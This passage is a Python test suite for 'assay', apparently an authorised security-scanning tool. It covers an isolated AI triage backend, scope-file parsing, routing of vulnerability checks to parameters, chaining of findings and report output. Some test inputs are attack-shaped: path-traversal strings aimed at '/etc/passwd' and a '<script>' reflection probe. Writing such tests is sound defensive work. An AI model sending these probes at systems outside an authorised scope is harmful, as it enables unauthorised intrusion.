        """A dry run never reaches a transport, so it must not demand one."""
        import tempfile
        from assay import ai as ai_mod
        from assay.redact import Redactor
        out = ai_mod.analyze(self._one_finding(), {}, self._cfg(dry_run=True),
                             Redactor(), tempfile.mkdtemp())
        self.assertTrue(out["dry_run"])

    def test_an_unknown_backend_never_falls_through_to_a_subprocess(self):
        """A typo'd backend must not silently become "run Claude Code"."""
        import subprocess, tempfile
        from assay import ai as ai_mod
        from assay.redact import Redactor

        def boom(*a, **k):
            raise AssertionError("a subprocess was started for an unknown backend")

        orig = subprocess.run
        subprocess.run = boom
        try:
            with self.assertRaises(ai_mod.BackendUnset):
                ai_mod.analyze(self._one_finding(), {},
                               self._cfg(backend="claude-clii"),
                               Redactor(), tempfile.mkdtemp())
        finally:
            subprocess.run = orig

    def test_cli_argv_carries_the_schema_and_every_isolation_flag(self):
        from assay import ai as ai_mod
        argv = ai_mod._cli_argv(self._cfg(backend="claude-cli", effort="low"),
                                "/usr/bin/claude")
        self.assertEqual(argv[0], "/usr/bin/claude")
        self.assertIn("--print", argv)
        self.assertEqual(argv[argv.index("--effort") + 1], "low")
        self.assertEqual(argv[argv.index("--output-format") + 1], "json")
        # Structured output is what makes the two backends interchangeable.
        schema = json.loads(argv[argv.index("--json-schema") + 1])
        self.assertEqual(schema, ai_mod.RESPONSE_SCHEMA)
        self.assertEqual(argv[argv.index("--system-prompt") + 1],
                         ai_mod.SYSTEM_PROMPT)
        # Pinned literally, not looped over CLI_ISOLATION_FLAGS: iterating the
        # constant would pass just as happily after someone deleted one of them.
        # These four are what keep a triage call from being able to act.
        for flag in ("--restricted",            # no bash/code execution, no web fetch
                     "--strict-mcp-config",     # no MCP servers
                     "--disable-slash-commands",  # no skills
                     "--no-session-persistence"):  # nothing left on disk
            self.assertIn(flag, argv, "isolation flag %s was dropped" % flag)

    def _fake_run(self, envelope, seen=None, returncode=0):
        import subprocess

        def run(argv, **kw):
            if seen is not None:
                seen["argv"] = argv
                seen["stdin"] = kw.get("input", "")
                seen["cwd"] = kw.get("cwd")
                seen["cwd_contents"] = (os.listdir(kw["cwd"])
                                        if kw.get("cwd") else None)
            return subprocess.CompletedProcess(argv, returncode,
                                               json.dumps(envelope), "")
        return run

    def test_cli_backend_parses_the_envelope(self):
        import subprocess, tempfile
        from assay import ai as ai_mod
        from assay.redact import Redactor

        answer = {"summary": "nothing much", "triage": [], "chains": []}
        envelope = {"type": "result", "subtype": "success", "is_error": False,
                    "result": json.dumps(answer), "total_cost_usd": 0,
                    "session_id": "abc",
                    "usage": {"input_tokens": 120, "output_tokens": 30}}
        seen = {}
        orig_run, orig_status = subprocess.run, ai_mod.cli_status
        subprocess.run = self._fake_run(envelope, seen)
        ai_mod.cli_status = lambda cfg=None: (True, "stub")
        self._stub_resolve(ai_mod)
        try:
            out = ai_mod.analyze(self._one_finding(), {},
                                 self._cfg(backend="claude-cli"),
                                 Redactor(), tempfile.mkdtemp())
        finally:
            subprocess.run, ai_mod.cli_status = orig_run, orig_status

        self.assertEqual(out["summary"], "nothing much")
        self.assertEqual(out["_backend"], "claude-cli")
        self.assertEqual(out["_usage"]["input_tokens"], 120)
        # The payload goes in on stdin, not argv - it is far too big for one.
        self.assertIn("pseudonymised scan results", seen["stdin"])
        self.assertNotIn(seen["stdin"], seen["argv"])
        # And it runs somewhere with no scan output and no CLAUDE.md in it.
        self.assertEqual(seen["cwd_contents"], [])
        self.assertFalse(os.path.exists(seen["cwd"]), "sandbox was left behind")

    def test_cli_input_tokens_include_cache_creation(self):
        """The CLI puts nearly all of a first-turn prompt in cache_creation.

        Reporting bare input_tokens made a 1.4k-token payload print as "10 in",
        which reads as a broken measurement.
        """
        import subprocess, tempfile
        from assay import ai as ai_mod
        from assay.redact import Redactor

        envelope = {"type": "result", "subtype": "success", "is_error": False,
                    "result": json.dumps({"summary": "s", "triage": [],
                                          "chains": []}),
                    "total_cost_usd": 0.0597,
                    "usage": {"input_tokens": 10,
                              "cache_creation_input_tokens": 1411,
                              "cache_read_input_tokens": 0,
                              "output_tokens": 3641}}
        orig_run, orig_status = subprocess.run, ai_mod.cli_status
        subprocess.run = self._fake_run(envelope)
        ai_mod.cli_status = lambda cfg=None: (True, "stub")
        self._stub_resolve(ai_mod)
        try:
            out = ai_mod.analyze(self._one_finding(), {},
                                 self._cfg(backend="claude-cli"),
                                 Redactor(), tempfile.mkdtemp())
        finally:
            subprocess.run, ai_mod.cli_status = orig_run, orig_status
        self.assertEqual(out["_usage"]["input_tokens"], 1421)
        self.assertEqual(out["_usage"]["output_tokens"], 3641)
        self.assertEqual(out["_usage"]["cost_estimate_usd"], 0.0597)

    def test_cli_backend_surfaces_an_error_envelope(self):
        """is_error is the authoritative field - subtype stays "success"."""
        import subprocess, tempfile
        from assay import ai as ai_mod
        from assay.redact import Redactor

        envelope = {"type": "result", "subtype": "success", "is_error": True,
                    "result": "Failed to authenticate: OAuth session expired",
                    "usage": {}}
        orig_run, orig_status = subprocess.run, ai_mod.cli_status
        subprocess.run = self._fake_run(envelope)
        ai_mod.cli_status = lambda cfg=None: (True, "stub")
        self._stub_resolve(ai_mod)
        try:
            with self.assertRaises(ai_mod.AIError) as caught:
                ai_mod.analyze(self._one_finding(), {},
                               self._cfg(backend="claude-cli"),
                               Redactor(), tempfile.mkdtemp())
        finally:
            subprocess.run, ai_mod.cli_status = orig_run, orig_status
        self.assertIn("OAuth session expired", str(caught.exception))

    def test_cli_backend_still_honours_the_redaction_gate(self):
        """The gate is transport-independent: a leak must stop the CLI too."""
        import subprocess, tempfile
        from assay import ai as ai_mod
        from assay.models import Evidence, Finding
        from assay.redact import Redactor

        findings = [Finding(title="x", target="https://a.acmebank.com/",
                            severity="high", impact="y",
                            evidence=[Evidence(kind="http", output="10.9.9.9")])]
        called = {"n": 0}

        def boom(*a, **k):
            called["n"] += 1
            raise AssertionError("a subprocess was started despite a leak")

        orig_run = subprocess.run
        subprocess.run = boom
        try:
            r = Redactor()
            # Force a residue the redactor does not know how to pseudonymise.
            orig_verify = r.verify
            r.verify = lambda blob: ["acmebank.com"]
            try:
                with self.assertRaises(ai_mod.RedactionFailure):
                    ai_mod.analyze(findings, {},
                                   self._cfg(backend="claude-cli",
                                             include_evidence=True),
                                   r, tempfile.mkdtemp())
            finally:
                r.verify = orig_verify
        finally:
            subprocess.run = orig_run
        self.assertEqual(called["n"], 0)

    def test_unparseable_output_is_kept_on_disk(self):
        import tempfile
        from assay import ai as ai_mod
        out_dir = tempfile.mkdtemp()
        with self.assertRaises(ai_mod.AIError):
            ai_mod._parse_result("I would rather not.", out_dir)
        self.assertTrue(os.path.exists(os.path.join(out_dir, "ai-raw.txt")))

    def test_fenced_json_is_recovered(self):
        import tempfile
        from assay import ai as ai_mod
        text = 'Here you go:\n```json\n{"summary": "ok", "triage": []}\n```'
        self.assertEqual(ai_mod._parse_result(text, tempfile.mkdtemp())["summary"],
                         "ok")


class EmptyStateTests(unittest.TestCase):
    """Read commands on a folder that was never scanned.

    Store() creates the database if missing, so every read command used to
    produce an empty result and leave a stray assay.db behind.
    """

    def test_open_run_reports_missing_and_creates_nothing(self):
        import os, tempfile
        from assay.cli import open_run
        d = os.path.join(tempfile.mkdtemp(), "never")
        store, resolved = open_run(d)
        self.assertIsNone(store)
        self.assertFalse(os.path.exists(os.path.join(d, "assay.db")),
                         "a stray database was created")
        self.assertFalse(os.path.exists(d), "a stray folder was created")

    def test_open_run_finds_an_existing_run(self):
        import os, tempfile
        from assay.cli import open_run
        from assay.store import Store
        d = tempfile.mkdtemp()
        Store(os.path.join(d, "assay.db")).close()
        store, resolved = open_run(d)
        self.assertIsNotNone(store)
        store.close()

    def test_open_run_resolves_the_newest_engagement_subfolder(self):
        import os, tempfile, time
        from assay.cli import open_run
        from assay.store import Store
        root = tempfile.mkdtemp()
        for name in ("ALPHA", "BRAVO"):
            os.makedirs(os.path.join(root, name))
            Store(os.path.join(root, name, "assay.db")).close()
            time.sleep(0.01)
        store, resolved = open_run(root)
        self.assertIsNotNone(store)
        self.assertTrue(resolved.endswith("BRAVO"))
        store.close()


class ParamInferenceTests(unittest.TestCase):
    """Which checks a parameter earns, from its name and observed value."""

    def test_value_beats_name_when_unambiguous(self):
        from assay.params import classify
        self.assertEqual(classify("id", "https://a.tld"), "url")
        self.assertEqual(classify("id", "/etc/passwd"), "path")

    def test_a_redirect_name_survives_a_relative_value(self):
        """next=/dashboard is the most common shape of an open redirect.

        Reading it as a path means the redirect check never runs on it.
        """
        from assay.params import classify, targets_for
        self.assertEqual(classify("next", "/dashboard"), "url")
        self.assertEqual(
            targets_for("openredirect", "https://t/login?next=/dashboard"), ["next"])

    def test_a_boolean_name_with_a_non_boolean_value_is_not_a_flag(self):
        """debug=<script> is a reflection candidate, not a switch."""
        from assay.params import classify, targets_for
        self.assertEqual(classify("debug", "<script>"), "unknown")
        self.assertIn("debug",
                      targets_for("reflection", "https://t/x?debug=%3Cscript%3E"))
        self.assertEqual(classify("debug", "true"), "bool")

    def test_checks_are_routed_to_plausible_parameters_only(self):
        from assay.params import targets_for
        u = ("https://t/x?id=42&url=https://a.tld&file=../../etc/passwd"
             "&q=hi&debug=true")
        self.assertEqual(targets_for("ssrf", u), ["url"])
        self.assertEqual(targets_for("traversal", u), ["file"])
        self.assertEqual(targets_for("openredirect", u), ["url"])
        self.assertIn("id", targets_for("sqli", u))
        self.assertNotIn("url", targets_for("sqli", u))

    def test_unknown_parameters_still_get_every_check(self):
        """Inference narrows work when confident and gets out of the way."""
        from assay.params import targets_for
        u = "https://t/x?wibble=zzz"
        for check in ("sqli", "ssrf", "traversal", "reflection", "ssti"):
            self.assertEqual(targets_for(check, u), ["wibble"])

    def test_pagination_is_not_an_idor_candidate(self):
        from assay.params import idor_candidates
        got = [n for n, _v, _k in idor_candidates(
            "https://t/a?user_id=1004&page=2&offset=40&limit=10&invoice=889")]
        self.assertEqual(sorted(got), ["invoice", "user_id"])


class PrevalenceTests(unittest.TestCase):
    def _f(self, title, host, module, sev="info"):
        from assay.models import Evidence, Finding
        f = Finding(title=title, target="https://%s/" % host, module=module,
                    severity=sev, confidence="confirmed", impact="i",
                    evidence=[Evidence(kind="http", output="x")])
        f.compute_score()
        return f

    def test_a_finding_on_every_host_is_ranked_down(self):
        from assay.correlate import apply_prevalence, environmental
        fs = [self._f("Security headers absent", "h%d.t" % i, "headers")
              for i in range(8)]
        before = fs[0].score
        p = environmental(fs)
        self.assertIn("Security headers absent", p)
        apply_prevalence(fs, p)
        self.assertLess(fs[0].score, before)
        self.assertIn("environmental", fs[0].tags)
        self.assertIn("environment", fs[0].notes)

    def test_a_small_scope_is_never_collapsed(self):
        """Three of four is a small sample, not an estate-wide policy."""
        from assay.correlate import environmental
        fs = [self._f("Security headers absent", "h%d.t" % i, "headers")
              for i in range(3)]
        self.assertEqual(environmental(fs), {})

    def test_a_finding_on_one_host_is_untouched(self):
        from assay.correlate import apply_prevalence, environmental
        fs = [self._f("Security headers absent", "h%d.t" % i, "headers")
              for i in range(8)]
        rare = self._f("Exposed .env file", "h3.t", "exposure", "critical")
        fs.append(rare)
        before = rare.score
        apply_prevalence(fs, environmental(fs))
        self.assertEqual(rare.score, before)
        self.assertNotIn("environmental", rare.tags)


class ChainTests(unittest.TestCase):
    def _f(self, title, target, module, sev="medium", detail=""):
        from assay.models import Evidence, Finding
        f = Finding(title=title, target=target, module=module, severity=sev,
                    confidence="confirmed", impact="i", detail=detail,
                    evidence=[Evidence(kind="http", output="x")])
        f.compute_score()
        return f

    def test_cors_sibling_plus_takeover_on_the_same_apex(self):
        from assay.correlate import chains
        fs = [self._f("CORS trusts any subdomain of the parent domain",
                      "https://api.acme.tld/v1/me", "cors"),
              self._f("Subdomain takeover: dangling CNAME to Heroku",
                      "dead.acme.tld", "takeover", "high")]
        got = chains(fs)
        self.assertTrue(any("Subdomain takeover into" in c.name for c in got))
        self.assertEqual(got[0].severity, "critical")

    def test_no_chain_when_the_apex_differs(self):
        """A takeover on someone else's domain does not chain."""
        from assay.correlate import chains
        fs = [self._f("CORS trusts any subdomain of the parent domain",
                      "https://api.acme.tld/v1/me", "cors"),
              self._f("Subdomain takeover: dangling CNAME to Heroku",
                      "dead.other.tld", "takeover", "high")]
        self.assertFalse(any("Subdomain takeover into" in c.name
                             for c in chains(fs)))

    def test_reflection_plus_missing_csp_on_the_same_host(self):
        from assay.correlate import chains
        fs = [self._f("Input reflected into HTML with tag characters unencoded",
                      "https://app.t/s", "reflection", "high"),
              self._f("Security headers absent", "https://app.t/", "headers",
                      "info", detail="Missing: Content-Security-Policy")]
        self.assertTrue(any("no Content-Security-Policy" in c.name
                            for c in chains(fs)))

    def test_reflection_and_csp_on_different_hosts_do_not_chain(self):
        from assay.correlate import chains
        fs = [self._f("Input reflected into HTML with tag characters unencoded",
                      "https://app.t/s", "reflection", "high"),
              self._f("Security headers absent", "https://other.t/", "headers",
                      "info", detail="Missing: Content-Security-Policy")]
        self.assertFalse(any("no Content-Security-Policy" in c.name
                             for c in chains(fs)))

    def test_an_empty_finding_set_produces_no_chains(self):
        from assay.correlate import chains
        self.assertEqual(chains([]), [])

    def test_chains_are_ordered_strongest_first(self):
        from assay.correlate import chains
        fs = [self._f("Open redirect via 'redirect_uri' parameter",
                      "https://sso.t/oauth/authorize?redirect_uri=x",
                      "openredirect"),
              self._f("Exposed .env file", "https://p.t/.env", "exposure",
                      "critical")]
        got = chains(fs)
        self.assertTrue(got)
        order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        self.assertEqual([order[c.severity] for c in got],
                         sorted(order[c.severity] for c in got))


class IdorInventoryTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def test_object_references_are_collected_and_deduplicated(self):
        from assay.modules.web_idor import IdorInventoryModule
        urls = [self.ORIGIN + "/api/orders/view?order_id=8891",
                self.ORIGIN + "/api/orders/view?order_id=8892",
                self.ORIGIN + "/account/profile?user_id=1004",
                self.ORIGIN + "/search?q=hello&page=2",
                self.ORIGIN + "/static/app.js?v=3"]
        ctx, _ = make_ctx([], urls={self.ORIGIN: urls})
        found = IdorInventoryModule().run_web(ctx, web_target())
        self.assertTrue(found)
        body = found[0].evidence[0].output
        self.assertIn("order_id", body)
        self.assertIn("user_id", body)
        self.assertNotIn("page=", body, "pagination is not an object reference")
        self.assertEqual(body.count("/api/orders/view"), 1, "not deduplicated")

    def test_nothing_reported_when_there_are_no_object_references(self):
        from assay.modules.web_idor import IdorInventoryModule
        ctx, _ = make_ctx([], urls={self.ORIGIN: [self.ORIGIN + "/search?q=hi"]})
        self.assertEqual(IdorInventoryModule().run_web(ctx, web_target()), [])


class TrafficTagTests(unittest.TestCase):
    """Some programmes require automated traffic to be identifiable."""

    def test_no_platform_name_is_baked_into_the_default(self):
        """The header name is programme-specific and must stay generic here."""
        from assay.config import Config
        self.assertNotIn("the platform", Config().traffic_tag_header.lower())

    def test_tag_is_applied_to_every_request(self):
        from assay.config import Config
        cfg = Config(traffic_tag="a1b2c3d4-ENGAGEMENT-01")
        self.assertEqual(cfg.request_headers()["X-Scan-Tag"],
                         "a1b2c3d4-ENGAGEMENT-01")

    def test_tag_header_name_is_configurable(self):
        from assay.config import Config
        cfg = Config(traffic_tag="x", traffic_tag_header="X-Researcher")
        self.assertEqual(cfg.request_headers()["X-Researcher"], "x")
        self.assertNotIn("X-Scan-Tag", cfg.request_headers())

    def test_no_tag_adds_no_header(self):
        from assay.config import Config
        self.assertNotIn("X-Scan-Tag", Config().request_headers())


class SubmissionTemplateTests(unittest.TestCase):
    def test_idor_template_demands_what_the_policy_requires(self):
        from assay import submission
        t = submission.load_templates()["idor"]
        notes = t["notes"].lower()
        for requirement in ("accounts used", "permissions", "screenshots",
                            "application-specific"):
            self.assertIn(requirement, notes,
                          "IDOR template omits: %s" % requirement)

    def test_templates_that_mention_credentials_warn_against_using_them(self):
        """Using a found credential to reach more of the app is a violation.

        Only templates whose finding *is* a disclosed credential need the
        warning; a template that merely says not to retrieve credentials is
        already declining to use one.
        """
        from assay import submission
        needs_warning = ("exposure", "secrets", "archive")
        for name in needs_warning:
            notes = " ".join(submission.load_templates()[name]["notes"].split()).lower()
            self.assertTrue(
                "do not use" in notes or "not use" in notes
                or "rotate" in notes or "nothing more" in notes,
                "%s does not constrain use of the credential" % name)

    def test_every_template_still_well_formed(self):
        import re
        from assay import submission
        vec = re.compile(r"^CVSS:3\.1/AV:[NALP]/AC:[LH]/PR:[NLH]/UI:[NR]/S:[UC]"
                         r"/C:[NLH]/I:[NLH]/A:[NLH]$")
        for name, t in submission.load_templates().items():
            for field in ("category", "cvss", "summary", "steps", "remediation",
                          "notes"):
                self.assertIn(field, t, "%s missing %s" % (name, field))
            self.assertTrue(vec.match(t["cvss"]), "%s bad vector" % name)


class TargetFileTests(unittest.TestCase):
    """Scope arrives as a Burp export, a host list, a CSV, or a pasted table.

    A dropped host is a missed finding and a stray one is a request somewhere
    it should not go, so the parser is tested on the shapes that actually turn
    up rather than a tidy list.
    """

    def _parse(self, text):
        from assay.targets import parse
        return parse(text)

    # -- classification --------------------------------------------------
    def test_kinds_are_recognised(self):
        from assay.targets import classify
        cases = {"10.0.0.1": "ip", "10.0.0.0/24": "cidr", "example.com": "host",
                 "*.example.com": "wildcard", "https://a.example.com/x": "url",
                 "10.0.0.1-10.0.0.5": "range", "not a target": ""}
        for token, kind in cases.items():
            self.assertEqual(classify(token), kind, token)

    # -- the bug that ate wildcards ---------------------------------------
    def test_a_wildcard_keeps_its_asterisk(self):
        """Bullet-stripping must not turn *.example.com into .example.com."""
        from assay.targets import _clean
        self.assertEqual(_clean("*.corp.example.com"), "*.corp.example.com")
        self.assertEqual(_clean("- api.example.com"), "api.example.com")
        self.assertEqual(_clean("* legacy.example.com"), "legacy.example.com")
        r = self._parse("app.example.com\n*.corp.example.com\n")
        self.assertIn("*.corp.example.com", r.targets)

    # -- sections ----------------------------------------------------------
    def test_out_of_scope_sections_become_exclusions(self):
        r = self._parse("# In Scope\napp.example.com\n\n"
                        "## Out of Scope\nvpn.example.com\n")
        self.assertEqual(r.targets, ["app.example.com"])
        self.assertEqual(r.excluded, ["vpn.example.com"])

    def test_a_bang_prefix_excludes_a_single_line(self):
        r = self._parse("app.example.com\n!vpn.example.com\n")
        self.assertEqual(r.targets, ["app.example.com"])
        self.assertEqual(r.excluded, ["vpn.example.com"])

    # -- messy shapes ------------------------------------------------------
    def test_a_pasted_markdown_table_is_read(self):
        r = self._parse("| Host | Type |\n| --- | --- |\n"
                        "| api.example.com | web |\n| 10.30.1.5 | host |\n")
        self.assertEqual(r.targets, ["api.example.com", "10.30.1.5"])

    def test_a_csv_is_read_and_junk_columns_ignored(self):
        r = self._parse("host,env,owner\napi.example.com,prod,team-a\n"
                        "10.40.0.7,prod,team-b\n")
        self.assertEqual(r.targets, ["api.example.com", "10.40.0.7"])

    def test_ranges_expand(self):
        r = self._parse("10.0.0.1-10.0.0.4\n")
        self.assertEqual(r.targets,
                         ["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4"])
        self.assertEqual(self._parse("10.0.0.1-4\n").targets,
                         ["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4"])

    def test_an_absurd_range_is_refused_not_expanded(self):
        r = self._parse("10.0.0.1-10.9.0.1\n")
        self.assertEqual(r.targets, [])
        self.assertTrue(r.skipped)

    def test_duplicates_collapse(self):
        r = self._parse("api.example.com\nAPI.example.com\napi.example.com\n")
        self.assertEqual(len(r.targets), 1)

    def test_dangerous_entries_are_refused(self):
        r = self._parse("0.0.0.0/0\nlocalhost\napp.example.com\n")
        self.assertEqual(r.targets, ["app.example.com"])
        self.assertEqual(len(r.skipped), 2)

    def test_a_very_large_cidr_warns(self):
        r = self._parse("10.0.0.0/8\n")
        self.assertIn("10.0.0.0/8", r.targets)
        self.assertTrue(any("65,000" in w or "scope" in w for w in r.warnings))

    # -- Burp --------------------------------------------------------------
    BURP_ADVANCED = ('{"target":{"scope":{"advanced_mode":true,'
                     '"include":[{"enabled":true,"file":"^/.*","host":"^app\\\\.example\\\\.com$"},'
                     '{"enabled":true,"file":"^/.*","host":"^.*\\\\.corp\\\\.example\\\\.com$"},'
                     '{"enabled":false,"file":"^/.*","host":"^off\\\\.example\\\\.com$"}],'
                     '"exclude":[{"enabled":true,"file":"^/.*","host":"^vpn\\\\.example\\\\.com$"}]}}}')

    def test_burp_advanced_regexes_become_hosts(self):
        r = self._parse(self.BURP_ADVANCED)
        self.assertEqual(r.source_format, "burp")
        self.assertIn("app.example.com", r.targets)
        self.assertIn("*.corp.example.com", r.targets)
        self.assertIn("vpn.example.com", r.excluded)

    def test_disabled_burp_entries_are_ignored(self):
        r = self._parse(self.BURP_ADVANCED)
        self.assertNotIn("off.example.com", r.targets)

    def test_a_burp_path_exclusion_never_drops_the_host(self):
        """Burp excludes are path-scoped; assay's scope is host-level.

        Converting one into a host exclusion would silently remove an in-scope
        target, which is the worst possible failure for a scope file.
        """
        raw = ('{"target":{"scope":{"advanced_mode":false,'
               '"include":[{"enabled":true,"prefix":"https://shop.example.com/"}],'
               '"exclude":[{"enabled":true,"prefix":"https://shop.example.com/logout"}]}}}')
        r = self._parse(raw)
        self.assertFalse(any("shop.example.com" in e for e in r.excluded),
                         "a path exclusion removed the whole host")
        self.assertTrue(any("shop.example.com" in t for t in r.targets))
        self.assertTrue(r.skipped, "the unapplied rule must be reported")

    def test_scope_object_agrees_with_the_target_parser(self):
        from assay.config import Scope
        s = Scope(allow=["app.example.com", "*.corp.example.com"],
                  deny=["vpn.example.com"])
        self.assertTrue(s.allows("app.example.com"))
        self.assertTrue(s.allows("anything.corp.example.com"))
        self.assertFalse(s.allows("vpn.example.com"))
        self.assertFalse(s.allows("elsewhere.example.net"))

    def test_an_unrecognisable_file_says_so(self):
        r = self._parse("just some prose with no hosts in it at all\n")
        self.assertEqual(r.targets, [])
        self.assertTrue(r.warnings)


class UnifiedInputTests(unittest.TestCase):
    """One argument defines both what is scanned and what may be reached.

    Requiring a target list *and* a separate scope file means keeping two
    things in step by hand; the moment they diverge, either something goes
    untested or something receives a request it should not.
    """

    def _files(self):
        import json, os, tempfile
        d = tempfile.mkdtemp()
        with open(os.path.join(d, "hosts.txt"), "w") as fh:
            fh.write("# In Scope\napp.example.com\n*.corp.example.com\n"
                     "10.20.0.0/24\n\n## Out of Scope\nvpn.example.com\n")
        burp = {"target": {"scope": {"advanced_mode": True,
                "include": [{"enabled": True, "file": "^/.*",
                             "host": r"^app\.example\.com$"}],
                "exclude": [{"enabled": True, "file": "^/.*",
                             "host": r"^vpn\.example\.com$"}]}}}
        with open(os.path.join(d, "scope.json"), "w") as fh:
            json.dump(burp, fh)
        return d

    def test_inline_comma_separated(self):
        from assay.targets import resolve_inputs
        r = resolve_inputs(["10.20.0.0/24,app.example.com"])
        self.assertEqual(r.targets, ["10.20.0.0/24", "app.example.com"])

    def test_inline_space_separated(self):
        from assay.targets import resolve_inputs
        r = resolve_inputs(["a.example.com", "b.example.com"])
        self.assertEqual(r.targets, ["a.example.com", "b.example.com"])

    def test_a_txt_file(self):
        import os
        from assay.targets import resolve_inputs
        r = resolve_inputs([os.path.join(self._files(), "hosts.txt")])
        self.assertIn("app.example.com", r.targets)
        self.assertIn("vpn.example.com", r.excluded)

    def test_a_json_file(self):
        import os
        from assay.targets import resolve_inputs
        r = resolve_inputs([os.path.join(self._files(), "scope.json")])
        self.assertEqual(r.source_format, "burp")
        self.assertIn("app.example.com", r.targets)

    def test_files_and_inline_values_mix(self):
        import os
        from assay.targets import resolve_inputs
        d = self._files()
        r = resolve_inputs([os.path.join(d, "scope.json"), "extra.example.com"])
        self.assertIn("app.example.com", r.targets)
        self.assertIn("extra.example.com", r.targets)
        self.assertIn("burp", r.source_format)

    def test_scope_is_derived_and_actually_enforces(self):
        """Without a separate scope file the scan must still be constrained."""
        from assay.config import Scope
        from assay.targets import as_scope, resolve_inputs
        allow, deny = as_scope(resolve_inputs(["app.example.com"]))
        s = Scope(allow=allow, deny=deny)
        self.assertFalse(s.permissive, "a derived scope must not be permissive")
        self.assertTrue(s.allows("app.example.com"))
        self.assertFalse(s.allows("evil.example.net"))

    def test_wildcards_widen_scope_without_being_scanned(self):
        from assay.config import Scope
        from assay.targets import as_scope, resolve_inputs
        r = resolve_inputs(["app.example.com,*.corp.example.com"])
        allow, deny = as_scope(r)
        s = Scope(allow=allow, deny=deny)
        self.assertTrue(s.allows("anything.corp.example.com"),
                        "a wildcard must widen scope")
        self.assertIn("*.corp.example.com", r.targets)

    def test_exclusions_in_the_input_reach_the_scope(self):
        import os
        from assay.config import Scope
        from assay.targets import as_scope, resolve_inputs
        r = resolve_inputs([os.path.join(self._files(), "hosts.txt")])
        allow, deny = as_scope(r)
        s = Scope(allow=allow, deny=deny)
        self.assertTrue(s.allows("app.example.com"))
        self.assertFalse(s.allows("vpn.example.com"))

    def test_a_url_target_puts_its_host_in_scope(self):
        from assay.config import Scope
        from assay.targets import as_scope, resolve_inputs
        allow, deny = as_scope(resolve_inputs(["https://shop.example.com/cart"]))
        self.assertTrue(Scope(allow=allow, deny=deny).allows("shop.example.com"))

    def test_nothing_recognisable_is_reported(self):
        from assay.targets import resolve_inputs
        r = resolve_inputs(["this is just prose"])
        self.assertEqual(r.targets, [])
        self.assertTrue(r.warnings)


class MistypedInputTests(unittest.TestCase):
    """A filename that is not there must not become a scan target.

    Being in the wrong directory produced a scan of one host named
    'hosts.txt', which resolved to nothing and reported no findings -
    indistinguishable from a clean result.
    """

    def test_a_data_file_extension_is_never_a_hostname(self):
        from assay.targets import classify
        for name in ("hosts.txt", "scope.json", "targets.csv", "list.yaml"):
            self.assertEqual(classify(name), "", name)

    def test_a_missing_file_is_reported_not_scanned(self):
        from assay.targets import resolve_inputs
        r = resolve_inputs(["tinflood-hosts-in-scope.txt"])
        self.assertEqual(r.targets, [])
        self.assertTrue(r.skipped)
        self.assertTrue(any("does not exist" in w for w in r.warnings))

    def test_a_cidr_is_not_mistaken_for_a_path(self):
        """The slash in 10.20.0.0/24 must not trigger the missing-file check."""
        from assay.targets import resolve_inputs
        r = resolve_inputs(["10.20.0.0/24,app.example.com"])
        self.assertEqual(r.targets, ["10.20.0.0/24", "app.example.com"])
        self.assertEqual(r.skipped, [])

    def test_a_url_is_not_mistaken_for_a_path(self):
        from assay.targets import resolve_inputs
        r = resolve_inputs(["https://a.example.com/x"])
        self.assertEqual(r.targets, ["https://a.example.com/x"])

    def test_real_short_tlds_still_parse(self):
        from assay.targets import classify
        for host in ("a.co", "example.io", "x.dev"):
            self.assertEqual(classify(host), "host", host)


class InventoryTests(unittest.TestCase):
    """A clean scan and a scan that reached nothing must not look the same."""

    def _store(self, with_assets=True):
        import os, tempfile
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["x"])
        if with_assets:
            s.save_host("10.0.0.5", "10.0.0.5", {"ports": [
                {"port": 22, "service": "ssh", "product": "OpenSSH",
                 "version": "8.9"},
                {"port": 443, "service": "https", "product": "nginx",
                 "version": "1.24"}]})
            s.save_host("10.0.0.6", "10.0.0.6", {"ports": []})
            s.save_web("https://10.0.0.5/", "10.0.0.5", 443, 200, "Portal",
                       "nginx", ["Next.js"], {})
        return s

    def test_report_lists_hosts_services_and_endpoints(self):
        import os, tempfile
        from assay import report
        s = self._store()
        html = open(report.build(s, {"hosts": 2, "web": 1, "requests": 10,
                                     "duration": 5},
                                 os.path.join(tempfile.mkdtemp(), "r.html"))).read()
        for expected in ("What was found", "10.0.0.5", "443/https", "nginx",
                         "Live web endpoints", "Next.js", "22/ssh"):
            self.assertIn(expected, html, expected)

    def test_report_omits_the_section_when_nothing_was_found(self):
        import os, tempfile
        from assay import report
        s = self._store(with_assets=False)
        html = open(report.build(s, {"hosts": 0, "web": 0, "requests": 0,
                                     "duration": 1},
                                 os.path.join(tempfile.mkdtemp(), "r.html"))).read()
        self.assertNotIn("What was found", html)

    def test_hosts_with_no_open_ports_are_not_listed_as_services(self):
        import os, tempfile
        from assay import report
        s = self._store()
        html = open(report.build(s, {"hosts": 2, "web": 1, "requests": 10,
                                     "duration": 5},
                                 os.path.join(tempfile.mkdtemp(), "r.html"))).read()
        row = html[html.index("What was found"):]
        self.assertNotIn("10.0.0.6", row.split("Live web endpoints")[0])


_NMAP_XML_SAMPLE = """<?xml version="1.0"?>
<nmaprun>
<host><status state="up"/>
<address addr="203.0.113.64" addrtype="ipv4"/>
<hostnames><hostname name="mta2.example.com" type="PTR"/></hostnames>
<ports><port protocol="tcp" portid="25">
<state state="open"/><service name="smtp" product="IronPort smtpd"/>
</port></ports></host>
<host><status state="up"/>
<address addr="203.0.113.92" addrtype="ipv4"/>
<ports><port protocol="tcp" portid="443">
<state state="open"/><service name="https" product=""/>
</port></ports></host>
</nmaprun>
"""


class NmapReportSectionTests(unittest.TestCase):
    """The report's Nmap section: absent with nothing to show, present with
    the raw command/XML (HTML-escaped, since it lands in plain <pre>
    content) and a link to the pre-rendered NmapView beautified report when
    Engine._stage_nmapview() has produced one. The beautified render itself
    is a real standalone file opened in its own tab (raw/nmapview.html),
    not something reproduced inside this page - see build_nmapview_report()
    in tools.py."""

    def _report_with_raw(self, xml_name="nmap.xml", write_replay=True,
                         with_nmapview_html=False):
        import os, tempfile
        from assay import report
        from assay.models import Evidence, Finding
        from assay.store import Store
        out_dir = tempfile.mkdtemp()
        os.makedirs(os.path.join(out_dir, "raw"), exist_ok=True)
        with open(os.path.join(out_dir, "raw", xml_name), "w", encoding="utf-8") as fh:
            fh.write(_NMAP_XML_SAMPLE)
        if write_replay:
            with open(os.path.join(out_dir, "replay.sh"), "w", encoding="utf-8") as fh:
